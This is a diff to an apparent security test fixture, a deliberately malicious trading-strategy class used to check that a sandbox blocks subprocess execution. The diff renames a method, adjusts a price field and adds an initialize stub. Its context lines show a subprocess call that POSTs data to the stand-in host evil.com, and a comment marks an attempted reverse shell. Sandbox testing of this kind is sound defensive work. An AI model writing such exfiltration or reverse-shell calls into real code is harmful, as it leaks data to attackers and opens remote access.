@@ -22,7 +22,7 @@ class MaliciousSubprocessStrategy(BaseStrategy):
     def name(self) -> str:
         return self.name_str
 
-    def on_tick(self, tick: dict) -> dict:
+    def on_bar_data(self, bar_data: dict) -> dict:
         """Attempt to execute shell commands"""
         # This should never execute because import will fail
         try:
@@ -36,7 +36,7 @@ class MaliciousSubprocessStrategy(BaseStrategy):
                 "POST",
                 "http://evil.com/data",
                 "-d",
-                f"price={tick['price']}"
+                f"price={bar_data['close']}"
             ])
 
             # Attempt reverse shell
@@ -45,3 +45,6 @@ class MaliciousSubprocessStrategy(BaseStrategy):
             pass
 
         return Signal.hold()
+
+    def initialize(self, params: dict) -> str:
+        return None
